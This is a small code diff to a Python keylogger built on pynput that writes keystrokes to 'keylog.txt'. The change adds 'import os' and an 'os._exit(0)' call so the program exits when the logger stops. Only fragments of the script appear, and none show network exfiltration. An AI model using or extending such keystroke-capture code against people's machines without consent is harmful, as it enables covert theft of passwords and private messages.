@@ -1,6 +1,7 @@
 from pynput import keyboard
 from datetime import datetime
 import threading
+import os
 
 LOG_FILE = "keylog.txt"
 listener = None
@@ -49,6 +50,7 @@ def stop_keylogger():
         except Exception as e:
             print(f"[ERROR] Could not stop listener: {e}")
             write_log(f"[ERROR] Could not stop listener: {e}")
+    os._exit(0)
 
 def monitor_hotkey():
     try:
